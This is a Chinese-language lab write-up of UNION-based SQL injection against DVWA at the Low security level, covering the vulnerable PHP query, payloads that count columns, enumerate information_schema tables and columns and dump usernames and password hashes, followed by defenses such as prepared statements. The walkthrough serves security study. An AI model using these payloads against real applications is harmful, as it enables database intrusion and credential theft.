# DVWA SQL Injection (Low)

## 实验环境

* Kali Linux
* DVWA
* Burp Suite
* Security Level：Low

## 漏洞简介

SQL注入（SQL Injection）是指应用程序在构造SQL语句时，未对用户输入进行有效过滤或参数化处理，导致攻击者能够构造恶意SQL语句并提交给数据库执行。

在DVWA的Low级别中，用户输入会直接拼接到SQL查询语句中，因此存在典型的SQL注入漏洞。


## 漏洞原理

查看后端PHP代码：
```php
$id = $_REQUEST['id'];

$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```
用户输入的`id`参数未经任何过滤便直接拼接到SQL语句中。
正常情况下执行的SQL语句如下：
```ql
SELECT first_name,last_name
FROM users
WHERE user_id='1';
```
由于用户输入可控，攻击者可以构造特殊输入，改变原有SQL语句逻辑，从而实现数据库信息获取。

## 漏洞利用过程

### 1. 判断是否存在SQL注入

输入：1'
页面返回数据库错误信息。
说明用户输入已经参与SQL语句解析，存在SQL注入风险。

### 2. 判断查询字段数量

为了使用UNION联合查询，需要先确定原始查询语句返回的字段数量。
构造Payload：
1' order by 1#
1' order by 2#
1' order by 3#
测试发现：
order by 1和order by 2
执行正常。
order by 3 返回错误。说明当前查询语句共有2个字段。
> 注：由于URL中存在特殊字符，需要在Burp Suite Repeater中对Payload进行URL编码后再发送。

### 3. 确定回显位

构造Payload：
1' union select 1,2#
返回结果中成功显示：
```text
1
2
```
说明两个字段均能够回显查询结果。

### 4. 获取数据库信息

#### 获取数据库版本

Payload：
1' union select version(),2#  成功获取数据库版本信息。

#### 获取数据库名称

Payload：
1' union select database(),2#
返回结果：dvwa
确定当前数据库名称为：dvwa

### 5. 获取数据表名称

利用MySQL系统库中的`information_schema.tables`表查询数据库中的所有表。
Payload：
1' union select table_name,2
from information_schema.tables
where table_schema='dvwa'#
成功获取数据库中的表名。

### 6. 获取字段名称

已知目标表为：
users
继续查询表中的字段信息。
Payload：
1' union select column_name,2
from information_schema.columns
where table_name='users'#
得到：
user
password
first_name
last_name

### 7. 获取用户数据

已知用户名和密码字段后，构造Payload：
1' union select user,password
from users#
成功获取数据库中的用户名及密码信息。

## 漏洞形成原因
漏洞产生的根本原因是：
* 用户输入未进行过滤；
* 用户输入直接拼接进入SQL语句；
* 数据库将用户输入当作SQL代码执行。
因此攻击者能够通过构造特殊Payload修改原有查询逻辑。

## 防御措施
### 参数化查询（推荐）
采用Prepared Statement（预编译语句）实现SQL参数化处理。
示例：
$stmt = $pdo->prepare(
    "SELECT first_name,last_name FROM users WHERE user_id=?"
);

$stmt->execute([$id]);
参数与SQL语句分离后，用户输入将被当作普通数据处理，而不会被解释为SQL代码。

### 输入校验
对用户输入进行严格验证，例如：
* 类型检查
* 长度限制
* 白名单过滤

### 最小权限原则
数据库账户仅授予业务所需的最小权限，降低漏洞被利用后的影响范围。

## 学习总结
通过DVWA Low级别SQL注入实验，完整实践了SQL注入攻击的基本流程：
1. 判断注入点；
2. 确定字段数量；
3. 确定回显位；
4. 获取数据库信息；
5. 枚举表名与字段名；
6. 获取敏感数据。
本实验帮助理解了SQL注入的基本原理以及利用过程，同时加深了对MySQL系统表、UNION查询以及数据库信息枚举方式的认识。
